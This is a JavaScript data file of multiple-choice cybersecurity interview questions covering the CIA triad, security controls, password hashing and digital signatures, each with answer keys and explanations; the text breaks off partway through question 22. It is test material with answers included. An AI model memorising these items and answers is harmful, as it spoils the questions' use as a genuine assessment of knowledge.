// MNC Placement Cybersecurity Question Bank 2026 (100 Questions)
// Auto-generated & validated for placement preparation
const questionsData = [
  {
    "id": 1,
    "question": "A database administrator at a financial services firm accidentally discovers that junior software engineers have read-only access to customer salary records and Social Security numbers, even though their job roles only require access to mock staging data. Which core pillar of the CIA Triad has been compromised?",
    "options": {
      "A": "Confidentiality",
      "B": "Integrity",
      "C": "Availability",
      "D": "Non-repudiation"
    },
    "correct_answer": "A",
    "topic": "Network Security",
    "subtopic": "Confidentiality & Access Control",
    "difficulty": "Medium",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Accenture-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Confidentiality ensures that sensitive information is shielded from unauthorized entities, processes, and individuals. Because junior engineers were able to view sensitive production data outside their authorization boundary, confidentiality was violated even if no data was modified.",
    "why_other_options_are_wrong": {
      "A": "Correct: Unauthorized disclosure or access to restricted sensitive records violates confidentiality.",
      "B": "Integrity relates to preventing unauthorized modification, alteration, or tampering with data, which did not occur here.",
      "C": "Availability ensures systems and data remain operational and accessible to authorized users when needed.",
      "D": "Non-repudiation guarantees that an entity cannot deny the authenticity of their signature or transmission."
    },
    "real_world_application": "Enforcing Principle of Least Privilege (PoLP) and Role-Based Access Control (RBAC) in AWS IAM and SQL databases."
  },
  {
    "id": 2,
    "question": "During a routine audit of an e-commerce order processing pipeline, engineers discover that an attacker intercepted API requests in transit and altered the price parameter from $499.00 to $4.99 before the transaction reached the payment gateway. Which security attribute was directly breached?",
    "options": {
      "A": "Confidentiality",
      "B": "Integrity",
      "C": "Availability",
      "D": "Authenticity"
    },
    "correct_answer": "B",
    "topic": "Network Security",
    "subtopic": "Data Integrity & Tampering",
    "difficulty": "Medium",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "TCS-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Integrity involves maintaining the consistency, accuracy, and trustworthiness of data over its entire lifecycle. Altering transaction values or payload parameters in transit without authorization is a direct violation of data integrity.",
    "why_other_options_are_wrong": {
      "A": "Confidentiality prevents unauthorized reading/exposure; while the attacker may have read the packet, the critical security breach cited is unauthorized alteration.",
      "B": "Correct: Tampering with or modifying data in flight directly violates integrity.",
      "C": "Availability deals with downtime, service outages, or denial of service, not price manipulation.",
      "D": "Authenticity confirms the identity of the sender; the primary property violated on the payload itself is its integrity."
    },
    "real_world_application": "Using HMAC (Hash-based Message Authentication Code) or TLS record layer protection to guarantee payload integrity."
  },
  {
    "id": 3,
    "question": "A hospital's patient record management server experiences an abrupt flood of 500 million malformed ICMP echo requests per second, driving CPU utilization to 100% and preventing ER doctors from retrieving urgent blood group reports. Which CIA Triad principle is under active attack?",
    "options": {
      "A": "Confidentiality",
      "B": "Integrity",
      "C": "Availability",
      "D": "Non-repudiation"
    },
    "correct_answer": "C",
    "topic": "Network Security",
    "subtopic": "Availability & Resource Exhaustion",
    "difficulty": "Medium",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Capgemini-style",
      "Wipro-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Availability guarantees timely and reliable access to computing resources and data for authorized personnel. Flooding a server to exhaust its CPU and bandwidth so legitimate users cannot access emergency services is a denial-of-service attack targeting availability.",
    "why_other_options_are_wrong": {
      "A": "Confidentiality protects against data leakage; here, no data was stolen or viewed by unauthorized parties.",
      "B": "Integrity protects against data corruption or unauthorized tampering; the patient records remain unchanged on disk.",
      "C": "Correct: Starving legitimate users of system resources violates the Availability principle.",
      "D": "Non-repudiation ensures actions cannot be denied; it is not the primary target of an ICMP flood."
    },
    "real_world_application": "Deploying DDoS mitigation shields (such as Cloudflare Magic Transit or AWS Shield) and rate limiting ICMP traffic."
  },
  {
    "id": 4,
    "question": "An IT security architect is designing an authentication protocol for a core banking application. Management mandates that every transaction record must be verifiable such that the sender cannot later dispute having authorized the transfer. Which security property and supporting technology best satisfy this requirement?",
    "options": {
      "A": "Confidentiality using AES-256 symmetric encryption",
      "B": "Availability using redundant active-passive database clustering",
      "C": "Integrity using SHA-256 hashing alone without keys",
      "D": "Non-repudiation using asymmetric digital signatures"
    },
    "correct_answer": "D",
    "topic": "Network Security",
    "subtopic": "Non-repudiation & CIA Extensions",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Deloitte-style",
      "IBM-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Non-repudiation prevents an individual from denying the authenticity or origin of a transmitted message. It is achieved using asymmetric digital signatures because only the private key owner could have produced the valid signature verifiable by their public key.",
    "why_other_options_are_wrong": {
      "A": "Symmetric encryption shares a single secret key between parties, so either party could have created the ciphertext, failing non-repudiation.",
      "B": "Clustering provides high availability and fault tolerance, but does not prove who authorized a transaction.",
      "C": "Unkeyed SHA-256 provides integrity verification if the hash is trusted, but cannot prove who authored the original data.",
      "D": "Correct: Non-repudiation via asymmetric digital signatures binds the transaction uniquely to the sender's private key."
    },
    "real_world_application": "SWIFT wire transfers and digital legal contracts requiring RSA/ECDSA digital signatures to prevent legal repudiation."
  },
  {
    "id": 5,
    "question": "A financial auditor claims that 'Encrypting a database with AES-GCM guarantees Confidentiality, Integrity, and Availability simultaneously.' How should a senior security engineer evaluate this claim?",
    "options": {
      "A": "The claim is partially false because AES-GCM provides Confidentiality and Integrity, but does not guarantee Availability against deletion or hardware loss.",
      "B": "The claim is false because encryption only guarantees Confidentiality; it has zero impact on Integrity or Availability.",
      "C": "The claim is entirely accurate because authenticated encryption (AEAD) covers all three CIA triad components.",
      "D": "The claim is false because AES-GCM provides only Availability and Integrity, requiring RSA for Confidentiality."
    },
    "correct_answer": "A",
    "topic": "Network Security",
    "subtopic": "CIA Trade-offs & Cryptographic Limits",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "Accenture-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "AES-GCM is an Authenticated Encryption with Associated Data (AEAD) mode that guarantees confidentiality (via counter mode encryption) and integrity/authenticity (via GMAC authentication tags). However, cryptography cannot guarantee Availability: if an attacker wipes the disk, drops packets, or deletes the encrypted file, the system becomes unavailable.",
    "why_other_options_are_wrong": {
      "A": "Correct: Cryptography handles confidentiality and integrity, while availability requires redundant hardware, backups, and failover.",
      "B": "Incorrect: GCM mode specifically embeds an authentication tag that detects tampering, thereby ensuring integrity.",
      "C": "Incorrect trap: AEAD modes do not protect against denial-of-service, data deletion, or physical hardware outages.",
      "D": "Incorrect: AES-GCM is the premier symmetric encryption standard for confidentiality as well."
    },
    "real_world_application": "Understanding why enterprise disaster recovery plans and multi-region backups are required alongside transparent database encryption (TDE)."
  },
  {
    "id": 6,
    "question": "Consider the trade-off triangle between Security Controls, System Usability, and System Availability. An enterprise enforces 32-character complex passwords rotated every 3 days, biometric verification for every file access, and multi-factor SMS tokens every 5 minutes. What is the most probable negative security outcome?",
    "options": {
      "A": "Decreased risk of social engineering attacks due to heightened user alertness",
      "B": "User circumvention habits, such as sticky notes with passwords and shadow IT adoption, degrading actual security posture",
      "C": "Immediate violation of database transaction integrity due to cryptographic exhaustion",
      "D": "Automatic elevation of all standard domain users to domain administrators"
    },
    "correct_answer": "B",
    "topic": "Network Security",
    "subtopic": "Security vs Usability Trade-offs",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Deloitte-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "When security controls become excessively burdensome and detach from human usability, employees seek workarounds (writing credentials on sticky notes, bypassing controls, using unapproved personal cloud tools). This phenomenon, known as security fatigue, drastically weakens real-world defense.",
    "why_other_options_are_wrong": {
      "A": "Fatigued and frustrated users are actually much more susceptible to phishing and social engineering.",
      "B": "Correct: Excessive friction drives users to bypass controls, creating dangerous security vulnerabilities.",
      "C": "Cryptographic database integrity is unaffected by client workstation authentication frequency.",
      "D": "Domain privileges are governed by IAM group assignments, not by excessive password rotation policies."
    },
    "real_world_application": "Adopting NIST SP 800-63B guidelines that recommend against frequent arbitrary password rotation in favor of MFA and passkeys."
  },
  {
    "id": 7,
    "question": "A ransomware operator encrypts all master database volumes on an enterprise server, holding the decryption key for ransom. The company has an offline immutable tape backup from 24 hours prior. From a CIA perspective, what is the immediate state of the data before the backup is restored?",
    "options": {
      "A": "Only Confidentiality is breached because the attacker can read the files.",
      "B": "Availability is compromised, but Integrity is perfectly preserved because the files are encrypted with valid mathematics.",
      "C": "Integrity and Availability are both compromised, while Confidentiality may or may not be breached depending on data exfiltration.",
      "D": "Neither Integrity nor Availability is compromised since backups exist in cold storage."
    },
    "correct_answer": "C",
    "topic": "Network Security",
    "subtopic": "Incident-based Reasoning (Ransomware)",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "LTIMindtree-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Unauthorized encryption of data is unauthorized modification, which fundamentally breaches Integrity. Furthermore, legitimate users are locked out of accessing the active files, breaching Availability. Confidentiality is breached only if the attacker exfiltrated the data (double extortion) prior to encryption.",
    "why_other_options_are_wrong": {
      "A": "Ransomware encryption does not automatically mean data was published or read; Availability and Integrity are certainly breached.",
      "B": "Incorrect trap: Unauthorized modification of plaintext into unreadable ciphertext is a direct destruction of authorized integrity.",
      "C": "Correct: Unauthorized ciphertext transformation breaches Integrity and denies service (Availability); exfiltration determines Confidentiality impact.",
      "D": "The live production database is down and corrupted; existing offline backups do not negate the live breach."
    },
    "real_world_application": "Incident classification under ISO 27001 / NIST Incident Response frameworks during enterprise ransomware containment."
  },
  {
    "id": 8,
    "question": "A software company implements an active-active dual data center setup with automated DNS failover, redundant ISP links, and uninterruptible power supplies (UPS). Which element of the CIA triad does this infrastructure investment primarily protect?",
    "options": {
      "A": "Integrity",
      "B": "Confidentiality",
      "C": "Authenticity",
      "D": "Availability"
    },
    "correct_answer": "D",
    "topic": "Network Security",
    "subtopic": "High Availability & Disaster Recovery",
    "difficulty": "Medium",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "Infosys-style",
      "Wipro-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Dual data centers, automated failover, redundant ISPs, and UPS battery systems are designed to eliminate single points of failure, ensuring that network applications remain operational and reachable around the clock, safeguarding Availability.",
    "why_other_options_are_wrong": {
      "A": "Redundancy alone does not prevent unauthorized data modification or race conditions.",
      "B": "Redundant data centers do not encrypt or protect data against unauthorized eavesdropping.",
      "C": "Authenticity requires cryptographic certificates, signatures, or multi-factor identity controls.",
      "D": "Correct: Eliminating downtime and hardware failure points directly enforces the Availability pillar."
    },
    "real_world_application": "Meeting high service-level agreements (SLA 99.999% 'five nines') for enterprise cloud applications."
  },
  {
    "id": 9,
    "question": "A network security analyst reviews an incident where an external attacker exploited an unauthenticated endpoint to download an unencrypted CSV export containing 200,000 customer email addresses and hashed passwords. The database contents were untouched and the application remained fully online. Which CIA property was exclusively violated?",
    "options": {
      "A": "Confidentiality",
      "B": "Availability",
      "C": "Integrity",
      "D": "Non-repudiation"
    },
    "correct_answer": "A",
    "topic": "Network Security",
    "subtopic": "Data Breach Classification",
    "difficulty": "Medium",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "HCLTech-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Because customer data was exposed to an unauthorized third party, Confidentiality was violated. Because the database was untouched and data remained unmodified, Integrity was preserved. Because the server remained responsive and online, Availability was preserved.",
    "why_other_options_are_wrong": {
      "A": "Correct: The unauthorized leakage/download of sensitive customer data is a strict Confidentiality breach.",
      "B": "The application experienced zero downtime and remained accessible, preserving Availability.",
      "C": "No records were altered, corrupted, or injected, meaning Integrity was not violated.",
      "D": "Non-repudiation relates to disproving sender identity in transactions, which is not the primary issue here."
    },
    "real_world_application": "Evaluating notification thresholds under GDPR and CCPA when customer PII is exfiltrated."
  },
  {
    "id": 10,
    "question": "An employee in accounting accidentally modifies an Excel sheet containing employee tax withholding percentages, causing payroll calculations to be skewed for 1,200 staff members. No external attacker was involved, and no confidentiality breach occurred. Which control would have been most effective at preventing this Integrity failure?",
    "options": {
      "A": "Deploying a stateful packet inspection firewall at the corporate perimeter",
      "B": "Implementing strict file access permissions, input validation rules, and separation of duties with dual authorization",
      "C": "Configuring an external IPSec VPN gateway for remote employees",
      "D": "Purchasing a higher capacity UPS generator for the office facility"
    },
    "correct_answer": "B",
    "topic": "Network Security",
    "subtopic": "Controls for Data Integrity",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Accenture-style",
      "Capgemini-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Integrity failures caused by human error or unauthorized internal modifications are mitigated by preventive application controls: cell-level locking, input validation checks (range limits), and the principle of dual control / separation of duties (requiring a second person to review changes).",
    "why_other_options_are_wrong": {
      "A": "Perimeter firewalls filter incoming/outgoing network packets, not internal human edits to local spreadsheets.",
      "B": "Correct: Input validation and four-eyes authorization directly prevent unauthorized or erroneous data mutations.",
      "C": "VPNs encrypt remote transit channels; they do not validate whether financial cell formulas are mathematically correct.",
      "D": "UPS systems prevent electrical power outages to ensure Availability, which was not compromised here."
    },
    "real_world_application": "Implementing 'Maker-Checker' workflow architecture in core banking and ERP software like SAP and Oracle."
  },
  {
    "id": 11,
    "question": "Which of the following scenarios demonstrates a conflict where maximizing Confidentiality directly creates a risk to Availability?",
    "options": {
      "A": "Hashing customer passwords using SHA-256 with a unique random salt for each user",
      "B": "Installing an Intrusion Detection System in passive listening mode on a switch port analyzer (SPAN)",
      "C": "Encrypting server hard drives with a single master private key stored exclusively on a physical smart card with no escrow or backup",
      "D": "Restricting database read privileges using Role-Based Access Control (RBAC)"
    },
    "correct_answer": "C",
    "topic": "Network Security",
    "subtopic": "CIA Trade-offs & Key Custody",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "Deloitte-style",
      "IBM-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "If drive encryption is implemented without key escrow, backup keys, or recovery procedures to maximize confidentiality, losing or damaging that single smart card permanently renders the encrypted data unrecoverable, destroying Availability.",
    "why_other_options_are_wrong": {
      "A": "Salting and hashing passwords securely protects credentials without impacting password verification availability.",
      "B": "A passive SPAN port copies traffic out-of-band; it cannot drop packets or degrade network availability.",
      "C": "Correct: Extreme confidentiality controls without key management redundancy introduce a single point of failure for availability.",
      "D": "Well-designed RBAC enforces proper access boundaries without obstructing legitimate authorized tasks."
    },
    "real_world_application": "Enterprise Key Management Systems (KMS) implementing M-of-N split-key recovery (Shamir's Secret Sharing)."
  },
  {
    "id": 12,
    "question": "A security operations team observes an alert where an unauthorized user repeatedly attempted to modify system log files in `/var/log/secure` to erase evidence of a brute-force login attempt. The operating system prevented the write because the log directory was configured with the immutable append-only attribute (`chattr +a`). Which security objective was preserved by this control?",
    "options": {
      "A": "Scalability",
      "B": "Confidentiality",
      "C": "Availability",
      "D": "Integrity"
    },
    "correct_answer": "D",
    "topic": "Network Security",
    "subtopic": "Audit Log Integrity & Non-repudiation",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "TCS-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Making audit logs append-only guarantees that existing records cannot be edited, overwritten, or deleted by intruders, preserving the historical truth and integrity of forensic evidence.",
    "why_other_options_are_wrong": {
      "A": "Scalability refers to handling growing workloads, completely unrelated to file permission attributes.",
      "B": "Append-only permissions do not hide the contents of log files from users who have read access.",
      "C": "While it prevents deletion, the core purpose of securing audit trails against alteration is proving forensic integrity.",
      "D": "Correct: Protecting logs from alteration or erasure directly preserves forensic data integrity."
    },
    "real_world_application": "Configuring WORM (Write Once, Read Many) storage for compliance with SEC Rule 17a-4 and PCI DSS log retention standards."
  },
  {
    "id": 13,
    "question": "In the context of the CIA Triad, which of the following is classified as a Detective Control rather than a Preventive or Corrective Control?",
    "options": {
      "A": "Continuous file integrity monitoring (FIM) that alerts when system configuration files are modified",
      "B": "Restoring database snapshots from an off-site cold storage vault following a disaster",
      "C": "Network layer end-to-end IPsec tunnel encryption",
      "D": "Hardening default router credentials and disabling Telnet in favor of SSH"
    },
    "correct_answer": "A",
    "topic": "Network Security",
    "subtopic": "Security Control Classifications",
    "difficulty": "Medium-Hard",
    "question_type": "Comparison",
    "company_pattern": [
      "Accenture-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Detective controls identify, log, and alert on security incidents or policy violations as they occur or after they have occurred. File Integrity Monitoring (FIM tools like Tripwire or OSSEC) detects modifications by comparing file hashes against known baselines.",
    "why_other_options_are_wrong": {
      "A": "Correct: File Integrity Monitoring inspects and alerts on anomalies, making it a classic Detective control.",
      "B": "Restoring backups is a Corrective control designed to recover systems after damage or data loss has occurred.",
      "C": "IPsec encryption is a Preventive control designed to stop eavesdroppers before they can inspect data in flight.",
      "D": "Hardening passwords and disabling vulnerable protocols are Preventive controls that block initial unauthorized access."
    },
    "real_world_application": "Security operations centers (SOC) leveraging SIEM and FIM alerts to detect unauthorized root access."
  },
  {
    "id": 14,
    "question": "A fintech company experiences an event where an employee mistakenly runs a database migration script that drops three production tables. The system immediately goes down. Fortunately, the engineering team executes a point-in-time recovery using write-ahead transaction logs, restoring full service within 12 minutes with zero lost transactions. How should this incident be categorized regarding CIA impact?",
    "options": {
      "A": "Confidentiality was breached for 12 minutes, but Integrity and Availability were unaffected.",
      "B": "Availability was temporarily disrupted, but Integrity was fully recovered and Confidentiality was never breached.",
      "C": "All three pillars (Confidentiality, Integrity, Availability) were permanently destroyed.",
      "D": "Integrity was breached permanently because a DROP TABLE command cannot be reversed in relational algebra."
    },
    "correct_answer": "B",
    "topic": "Network Security",
    "subtopic": "Incident Impact Analysis",
    "difficulty": "Medium",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Tech Mahindra-style",
      "Wipro-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "The drop command caused temporary downtime (an Availability impact of 12 minutes). Because point-in-time recovery restored all transactions cleanly, final Integrity was restored. No unauthorized user accessed sensitive data, so Confidentiality remained uncompromised.",
    "why_other_options_are_wrong": {
      "A": "No unauthorized party viewed data; confidentiality was never at stake.",
      "B": "Correct: Availability suffered temporary disruption, while integrity was preserved via recovery logs and confidentiality remained intact.",
      "C": "The incident was resolved with zero permanent data loss, contradicting permanent destruction.",
      "D": "Relational database engines with WAL (Write-Ahead Logging) easily achieve point-in-time state reconstruction."
    },
    "real_world_application": "Setting Recovery Point Objective (RPO=0) and Recovery Time Objective (RTO=15m) in AWS Aurora or PostgreSQL."
  },
  {
    "id": 15,
    "question": "A cybersecurity consultant evaluates an organization's network perimeter. The client states: 'We don't need integrity monitoring or cryptographic signatures because our entire perimeter is guarded by a next-generation firewall.' What fundamental security engineering principle is the client overlooking?",
    "options": {
      "A": "Kerckhoffs's Principle",
      "B": "Shannon's Maxim",
      "C": "Defense in Depth (Layered Defense)",
      "D": "Moore's Law of Cryptography"
    },
    "correct_answer": "C",
    "topic": "Network Security",
    "subtopic": "Defense in Depth",
    "difficulty": "Medium",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "Accenture-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Defense in Depth states that multiple layers of security controls (perimeter, network, host, application, and data) must be established so that if one layer fails (e.g., firewall bypass or insider threat), secondary defenses prevent a catastrophic breach.",
    "why_other_options_are_wrong": {
      "A": "Kerckhoffs's Principle states that a cryptosystem should be secure even if everything about the system, except the key, is public knowledge.",
      "B": "Shannon's Maxim is the cryptographic restatement of Kerckhoffs's principle: 'The enemy knows the system.'",
      "C": "Correct: Relying exclusively on perimeter firewalls ignores Defense in Depth, leaving internal assets vulnerable to insiders or lateral movement.",
      "D": "Moore's Law relates to semiconductor transistor density over time, not layered security architecture."
    },
    "real_world_application": "Zero Trust Architecture (ZTA) assuming that perimeter defenses can be breached and enforcing identity verification on every request."
  },
  {
    "id": 16,
    "question": "A junior cloud developer needs to store user account passwords in a PostgreSQL database. They propose encrypting each password using AES-256 with a secret key stored in an environment variable so the backend can decrypt and verify it during login. Why is this architecture fundamentally flawed from a security standpoint?",
    "options": {
      "A": "AES-256 is deprecated and easily brute-forced by modern quantum computing algorithms.",
      "B": "AES-256 is an asymmetric algorithm and requires an RSA public key to decrypt.",
      "C": "PostgreSQL cannot store AES-256 ciphertext without corrupting binary column indexes.",
      "D": "Passwords should never be encrypted with a reversible algorithm; they must be hashed with a salted, computationally expensive one-way function."
    },
    "correct_answer": "D",
    "topic": "Cryptography",
    "subtopic": "Encryption vs Hashing (Password Storage)",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "Accenture-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Encryption is a two-way (reversible) function intended for data that must be read again. Passwords must never be reversible: if the database or environment key is compromised, every password is exposed. Passwords must be hashed using a slow, salted one-way key-derivation function (such as bcrypt, Argon2, or PBKDF2).",
    "why_other_options_are_wrong": {
      "A": "AES-256 remains the global gold standard for symmetric encryption and is not deprecated or broken.",
      "B": "AES is a symmetric block cipher, not an asymmetric algorithm.",
      "C": "Relational databases easily store ciphertext using BYTEA or Base64-encoded VARCHAR columns.",
      "D": "Correct: Reversible encryption creates a catastrophic single point of failure if the key is leaked; one-way hashing with salt is mandatory."
    },
    "real_world_application": "Storing user authentication credentials securely complying with OWASP Top 10 Identification and Authentication Failures."
  },
  {
    "id": 17,
    "question": "In modern HTTPS (TLS 1.3), why does the browser not use asymmetric encryption (like RSA) to encrypt the entire stream of web traffic, choosing instead to use RSA/ECC only during the initial handshake and AES for bulk data transfer?",
    "options": {
      "A": "Symmetric algorithms like AES are computationally 100 to 1,000 times faster and can be hardware-accelerated directly on modern CPU chipsets (AES-NI).",
      "B": "Asymmetric encryption has a strict mathematical restriction that prevents it from encrypting data larger than 64 kilobytes.",
      "C": "Asymmetric encryption does not provide confidentiality; it only provides digital signature verification.",
      "D": "Web browsers are prohibited by international export regulations from performing asymmetric operations continuously."
    },
    "correct_answer": "A",
    "topic": "Cryptography",
    "subtopic": "Hybrid Cryptosystem & Computational Efficiency",
    "difficulty": "Medium-Hard",
    "question_type": "Comparison",
    "company_pattern": [
      "TCS-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Asymmetric cryptography involves heavy mathematical operations (modular exponentiation of multi-thousand-bit integers), making it orders of magnitude slower than symmetric block ciphers like AES, which use lightweight bitwise substitution and permutation networks optimized in hardware (AES-NI). Hybrid cryptography leverages asymmetric speed for key exchange and symmetric speed for payload transfer.",
    "why_other_options_are_wrong": {
      "A": "Correct: Symmetric encryption is drastically faster and hardware-accelerated, making it the only feasible choice for high-throughput bulk streams.",
      "B": "While RSA has plaintext size limits based on its key size (e.g. 245 bytes for 2048-bit RSA with OAEP), streaming chunks is theoretically possible but computationally prohibitive.",
      "C": "Asymmetric cryptography can encrypt for confidentiality (using the recipient's public key) as well as sign.",
      "D": "No such regulatory prohibition exists in modern internet protocols."
    },
    "real_world_application": "Optimizing web server throughput in Nginx/Apache handling tens of thousands of concurrent HTTPS TLS sessions."
  },
  {
    "id": 18,
    "question": "Alice wants to send a confidential, encrypted message to Bob using asymmetric cryptography (public-key cryptography). Which key must Alice use to encrypt the message so that ONLY Bob can read it?",
    "options": {
      "A": "Alice's Private Key",
      "B": "Bob's Public Key",
      "C": "Alice's Public Key",
      "D": "Bob's Private Key"
    },
    "correct_answer": "B",
    "topic": "Cryptography",
    "subtopic": "Public Key vs Private Key Operations",
    "difficulty": "Medium",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "Wipro-style",
      "Capgemini-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "In asymmetric encryption for confidentiality, the sender encrypts the plaintext using the recipient's publicly available key (Bob's Public Key). Only the corresponding private key, held exclusively by Bob (Bob's Private Key), can decrypt the resulting ciphertext.",
    "why_other_options_are_wrong": {
      "A": "Encrypting with Alice's Private Key creates a digital signature, not confidentiality, because anyone with Alice's Public Key can decrypt it.",
      "B": "Correct: Plaintext encrypted with Bob's Public Key can only be unlocked by Bob's secret Private Key.",
      "C": "Encrypting with Alice's Public Key means only Alice could decrypt it with her own private key; Bob would never be able to read it.",
      "D": "Alice does not possess Bob's Private Key (which is kept strictly secret by Bob alone)."
    },
    "real_world_application": "Sending PGP/GPG encrypted email messages or opening an SSH connection."
  },
  {
    "id": 19,
    "question": "Bob receives a document from Alice claiming to be an official project contract. To prove that Alice genuinely authored the document and that it was not modified in transit, Alice attaches a digital signature. How is this digital signature generated by Alice?",
    "options": {
      "A": "Alice hashes the document and encrypts the resulting hash with Bob's Public Key.",
      "B": "Alice encrypts the full document using her symmetric AES session key.",
      "C": "Alice hashes the document and encrypts the resulting hash with her own Private Key.",
      "D": "Alice encrypts the document with Bob's Private Key and attaches her public certificate."
    },
    "correct_answer": "C",
    "topic": "Cryptography",
    "subtopic": "Digital Signatures & Authentication",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Accenture-style",
      "LTIMindtree-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A digital signature is created by generating a cryptographic hash digest of the document, then encrypting that hash digest with the sender's (Alice's) Private Key. Anyone with Alice's Public Key can decrypt the hash and compare it against the received document's hash to verify authenticity and integrity.",
    "why_other_options_are_wrong": {
      "A": "Encrypting the hash with Bob's public key means only Bob can read the hash, but it does not prove who sent it.",
      "B": "Symmetric encryption with an AES key does not provide non-repudiation because both parties share the same key.",
      "C": "Correct: Signing equals hashing the payload followed by private key encryption, ensuring integrity and authenticity.",
      "D": "Alice does not possess Bob's Private Key; private keys are never shared."
    },
    "real_world_application": "Validating git commit signatures (GPG) and digitally signing PDF contracts (Adobe Acrobat Digital Signatures)."
  },
  {
    "id": 20,
    "question": "A software engineer notices that the team's password database hashes passwords using `MD5(password)`. An attacker steals this database dump. Why is plain unsalted MD5 considered disastrously insecure for credential protection in 2026?",
    "options": {
      "A": "MD5 generates variable-length outputs that corrupt database schemas.",
      "B": "MD5 is mathematically reversible using simple matrix inversion without any dictionary.",
      "C": "MD5 requires an active network connection to a Certificate Authority to verify hashes.",
      "D": "MD5 is extremely fast, allowing attackers to use precomputed rainbow tables and GPU clusters calculating billions of hashes per second to instantly reverse common passwords."
    },
    "correct_answer": "D",
    "topic": "Cryptography",
    "subtopic": "Hashing Vulnerabilities & Rainbow Tables",
    "difficulty": "Medium",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "TCS-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "MD5 was designed to be fast and lightweight for checksums, not secure password storage. Because it lacks a salt and has no computational work factor, modern GPUs can compute over 50 billion MD5 hashes per second, cracking unsalted passwords in seconds via rainbow tables and brute-force dictionaries.",
    "why_other_options_are_wrong": {
      "A": "MD5 always produces a fixed 128-bit (32 hexadecimal character) digest.",
      "B": "Cryptographic hashes are one-way lossy mathematical operations and cannot be 'inverted' mathematically; cracking is done via brute-force or precomputed lookups.",
      "C": "Hash functions are standalone local mathematical algorithms that require no CAs or networks.",
      "D": "Correct: Extreme speed and lack of salting enable near-instantaneous rainbow table and GPU brute-force attacks."
    },
    "real_world_application": "Migrating legacy MD5 user authentication tables to Argon2id or PBKDF2 with unique 16-byte salts."
  },
  {
    "id": 21,
    "question": "What is the specific cryptographic role of adding a unique 'Salt' to each user's password prior to hashing with a function like bcrypt?",
    "options": {
      "A": "It ensures that two users with identical passwords will have completely different hash values, rendering precomputed rainbow tables useless.",
      "B": "It encrypts the password ciphertext so only the database administrator can view it in cleartext.",
      "C": "It converts the symmetric hash into an asymmetric public-private key pair.",
      "D": "It compresses the password to guarantee it fits within an 8-bit memory register."
    },
    "correct_answer": "A",
    "topic": "Cryptography",
    "subtopic": "Password Salting Mechanics",
    "difficulty": "Medium",
    "question_type": "Application-Based",
    "company_pattern": [
      "Cognizant-style",
      "HCLTech-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A salt is a cryptographically random value generated uniquely for each user and concatenated with their password before hashing. Even if 1,000 users have the password 'Password123!', each will have a completely different stored hash, completely defeating precomputed rainbow tables.",
    "why_other_options_are_wrong": {
      "A": "Correct: Unique salts prevent identical hashes for identical passwords and neutralize precomputed lookup tables.",
      "B": "Salts do not make the hash reversible; DBAs still cannot read the cleartext password.",
      "C": "Salting does not turn a hash into asymmetric cryptography.",
      "D": "Salts increase the string length, not compress it into an 8-bit register."
    },
    "real_world_application": "Implementation of Django, Spring Security, or Devise user credential storage frameworks."
  },
  {
    "id": 22,
    "question": "Two distinct plaintexts, $M_1$ and $M_2$ (where $M_1 \\neq M_2$), produce the exact same cryptographic hash digest: $H(M_1) = H(M_2)$. What is this phenomenon called, and which mathematical concept guarantees that collisions must theoretically exist for any fixed-length hash function?",
    "options": {
      "A": "Ciphertext Malleability, governed by Fermat's Little Theorem",
      "B": "Hash Collision, governed by the Pigeonhole Principle",
      "C": "Avalanche Effect, governed by the Central Limit Theorem",
      "D": "Quantum Decoherence, governed by Heisenberg's Uncertainty Principle"
    },
    "correct_answer": "B",
    "topic": "Cryptography",
    "subtopic": "Hash Collisions & Pigeonhole Principle",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
